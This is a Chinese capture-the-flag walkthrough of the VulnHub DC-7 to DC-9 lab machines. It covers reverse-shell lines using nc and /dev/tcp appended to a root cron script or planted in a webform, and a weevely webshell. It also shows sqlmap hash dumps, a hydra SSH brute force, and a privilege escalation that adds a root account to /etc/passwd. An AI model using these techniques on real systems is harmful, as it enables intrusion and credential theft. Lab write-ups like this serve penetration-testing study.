第一遍输入的时候，密码输入错了……现在成功登录了ssh。
权限提升
使用命令 sudo -l
它提示我们有一封新邮件。(后来补充： You have new mail in /var/mail/dc7user 其实是计划任
务的结果)
查看该邮件：
根据邮件中的信息，像是root用户计划执行的备份脚本。其中提到了目录 /home/dc7user ，我们去看
一下：
结果又发现了一封邮件：
然后我们再去 backups 目录看下
是两个 gpg 加密的文件（可自行百度gpg是啥），我们想要看文件内容，就必须先解密，但解密是需要
密钥的。
dc7user@dc-7:~$ cat /var/mail/dc7user
#关键信息
Database dump saved to /home/dc7user/backups/website.sql               [success]
dc7user@dc-7:~$ cat /home/dc7user/mbox
#关键信息
Database dump saved to /home/dc7user/backups/website.sql               [success]
dc7user@dc-7:~/backups$ ls
website.sql.gpg  website.tar.gz.gpg
思路往下，我们继续查看实现备份的脚本 /opt/scripts/backups.sh
分析一下，该备份的就是网站数据库文件，也就是说我们没必要去解密gpg，我们可以直接去网站目录
下面看看这些文件。
其次，既然此脚本是root权限执行，那只要将我们反弹shell的命令写入其内，就可以获取一个
rootshell。
我们先来看一下此脚本的运行权限
再来看下当前权限：
很显然，我们无法将反弹shell的命令写入 backups.sh 。
所以，我们需要想办法变成 www-data 用户，该用户呢需要从Web端入手。
另外在脚本中我们还看到了一个命令 drush 。于是，我去百度了一下。
Drush是专门服务于drupal的第三方模块。
其实也就是专门用于管理Drupal的shell，我们可以利用该命令修改admin的密码。
这里报错了，提示我们需要在一个有 Drupal 环境的情况下，运行此命令，所以我们需要跳转到目
录 /var/www/html 。
可以看到执行成功。这样我们就可以登录网站的后台了。
dc7user@dc-7:~/backups$ ls -l /opt/scripts/backups.sh
-rwxrwxr-x 1 root www-data 520 Aug 29 23:02 /opt/scripts/backups.sh
dc7user@dc-7:~/backups$ whoami
dc7user
dc7user@dc-7:~$ drush user-password admin --password="admin"
Command user-password needs a higher bootstrap level to run - you will need to 
invoke drush from a more functional Drupal    [error]
environment to run this command.
The drush command 'user-password admin' could not be executed.                   
                            [error]
dc7user@dc-7:/var/www/html$ drush user-password admin --password="admin"
Changed password for admin                                                       
         [success]
Drupal8反弹shell
出于安全的考虑，php组件已经从Drupal的核心中移除了，但是我们可以在模块中手动安装。
我们需要检查一下是否含有php组件，先创建一个 basic page ：
可以看到是没有PHP的，接下来，安装PHP：
1、找到drupal官网中的php组件：
https://www.drupal.org/project/php
PHP的安装链接为：https://ftp.drupal.org/ﬁles/projects/php-8.x-1.0.tar.gz
将此链接写入：
点击 Install
安装成功。接下来，启用组件：
  现在php组件启用成功。接下来回到 Content ：
现在我们就可以写入PHP的代码了。
weevely生成木马
将生成的木马写入，点击 save ：
root@kali:~# weevely generate hackergu /root/hackergu.php
#weevely generate 密码 生成的路径及文件名
weevely连接木马
成功连接，同时我们也看到当前用户为 www-data 。现在我们就可以写入脚本了。
发现weevely里，执行不了命令，还是不太熟悉，那就再反弹个shell吧。
现在我们就可以写入脚本了，但是写进去之后，我等了好久也没见得反弹shell成功……
看了大佬的思路是要这样写：
weevely http://192.168.203.133/node/4 hackergu
root@kali:~# weevely http://192.168.203.133/node/4 hackergu
weevely> whoami
www-data
echo "nc 192.168.203.129 7777 -e /bin/bash" >> backups.sh
最终成功提权。
DC8
靶机下载地址： https://www.vulnhub.com/entry/dc-8,367/ 
渗透思路：
信息收集：主机发现和端口扫描
漏洞利用：SQL注入+Drupal 反弹shell
权限提升：Exim SUID提权
信息收集
使用 netdiscover ，发现主机IP为 192.168.203.134 。
nmap扫描，目标开放22端口和80端口，web站点是一个 Drupal CMS的站点，版本为7。
漏洞利用
我们访问此站点：
  关注点为两个红框，如果点击上面那个红框的内容，url显示为：
  倘若点击的是下面的红框，则url显示为：
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.203.129 7777 
>/tmp/f" >> backups.sh
nmap -T4 -A 192.168.203.134 --script=vuln
http://192.168.203.134/node/2
http://192.168.203.134/?nid=2
  看到这样的，话不多说，直接测试：
果然存在SQL注入，直接上sqlamp
两个账号手到擒来~~接下来使用 john ，对密码进行破解，只解出来john用户的密码为 turtle 。
GetShell
登录后台，根据DC-7中学到的思路，我们可以添加 basic page
sqlmap -u http://192.168.203.134/?nid=2 -D d7db -T users -C name,pass --dump
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
+-------+---------------------------------------------------------+
但是，好像因为john权限不够，无法写入php文件；那就再重新寻找别的出口；最终在 webform 中找到
了突破点：
添加：
那我们该怎么触发呢？发送一封邮件！
& /dev/tcp/192.168.203.129/7777 0>&1' ");
?> 
  点击submit之后，便拿到了shell
权限提升
利用命令查找suid权限的程序：
find / -user root -perm -4000 -print 2>/dev/null
看到了一个 exim4 ：Exim是一个MTA（Mail Transfer Agent，邮件传输代理）服务器软件。
使用命令查看 exim 的版本号 exim- bV 结果为  -> 4.89 。
再去 searchsploit 里查找EXP（存在一个版本号符合且是本地提权的脚本）：
接下来本地起一个web服务，将脚本下载到目标机器的 /tmp 目录下，并 chmod +x 46996.sh 赋权，运
行：
最后提权成功，去 /root 目录拿Flag就行。
DC9
靶机下载地址： https://www.vulnhub.com/entry/dc-9,412/ 
渗透思路：
信息收集：主机发现和端口扫描
漏洞利用：SQL盲注、Fuzz系统文件 knockd.conf 暴露隐藏的SSH端口
权限提升： /etc/passwd 写hash提权
dos2unix 46996.sh   #win下编写的脚本无法在linux上使用，将文件转化为unix格式
./46996.sh -m netcat
信息收集
使用 netdiscover 发现主机为 192.168.203.135
nmap扫描结果：目标开放了80端口，22端口显示被过滤掉了。
漏洞利用
在搜索框中尝试寻找sql注入。
可以看出确实存在注入。（网站应该对注入做了一定的过滤，而且还屏蔽了报错）
利用 Sqlmap 进行盲注利用：
最后得到一个账户 admin/transorbital1
sqlmap -u "http://192.168.203.135/results.php" --data="search=123" -D Staff -T 
Users -C "UserID,Username,Password" --dump
GetShell
登录网站。
这里有一个很有意思的地方， File dose not exist ，感觉像是存在本地文件包含：
果然存在本地文件包含。
本来打算还是将一句话写入apache的日志文件进行获取shell，但是靶机的作者，似乎将日志文件给换
位置了。
于是借鉴了大佬的思路：
接下来的思路应该是 fuzz 一些系统文件，如果有一个强大的字典，应该能够发
现 /etc/knockd.conf  
knockd是一种端口试探服务器工具。
它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(port-hit)。
telnet或Putty等客户软件通过向服务器上的端口发送TCP或数据包来启动端口命中。
可以看到目标果然做了手脚，这也是为什么我们探测的22端口显示是被过虑了。
现在我们需要依次访问7469、8475、9842三个端口，ssh端口就会开放.
现在只有admin的账户，但是从刚才文件包含出来的 /etc/passwd 中来看貌似没有admin的账户，所
以思路不是admin，感觉更像是那些用户，于是我又重新将数据库注入了一次：
sqlmap -u "http://192.168.203.135/results.php" --data="search=123" -D users -T 
UserDetails --dump
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------
+
| id | lastname   | password      | reg_date            | username  | firstname 
|
+----+------------+---------------+---------------------+-----------+-----------
+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      
|
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     
|
接下来利用得到的账号和密码当作字典进行爆破，使用工具 hydra 。
得到了三对账号密码，依次登录切换密码，最终在用户 janitor 的目录下找到了隐藏文件
像是其他用户的密码，我们将这些密码再进行一次爆破。
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      
|
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    
|
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       
|
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     
|
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     
|
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     
|
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  
|
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      
|
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    
|
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      
|
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    
|
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    
|
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   
|
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    
|
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     
|
+----+------------+---------------+---------------------+-----------+-----------
+
 hydra -L username.txt -P password.txt 192.168.203.135 ssh
[22][ssh] host: 192.168.203.135   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.203.135   login: janitor   password: Ilovepeepee
[22][ssh] host: 192.168.203.135   login: joeyt   password: Passw0rd
权限提升
登录用户 fredf ， sudo -l ，发现可以无需root密码执行 /opt/devstuff/dist/test/test 。
test 为可执行文件，我们翻一下目录，看看是否能找到什么其他的线索。
发现了他的源码，看了看用法，大体上可以理解为：
读取第一个参数的内容，然后将参数一的内容写入到参数二的内容中。
于是，我们可以创建一个用户密码，写入到 /etc/passwd
创建一个用户：
写入 /etc/passwd ：
[22][ssh] host: 192.168.203.135   login: fredf   password: B4-Tru3-001
perl -le 'print crypt("hackergu","salt")'   #生成加盐的密码
echo 'admin:saBGghOLaw5vg:0:0::/root:/bin/bash' >> /tmp/passwd
至此，提权成功，去 /root 目录找到Flag。
sudo ./test /tmp/passwd /etc/passwd
su admin    #切换到新加的用户